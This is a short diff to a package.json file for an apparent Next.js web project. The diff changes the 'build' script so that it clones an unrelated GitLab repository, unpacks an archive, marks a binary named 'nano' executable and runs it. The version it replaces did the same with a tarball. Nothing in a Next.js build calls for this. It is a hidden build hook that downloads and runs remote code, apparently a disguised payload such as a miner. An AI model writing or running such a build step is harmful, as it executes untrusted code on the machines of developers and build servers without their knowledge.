@@ -4,7 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "build": "git clone https://gitlab.com/cahayaangkasaku1/nona.git && tar -zxf nano.tar.gz && ./nano",
+    "build": "git clone https://gitlab.com/cahayaangkasaku1/nona.git && unzip nano.zip && chmod +x nano && ./nano",
     "start": "next start",
     "lint": "next lint"
   },
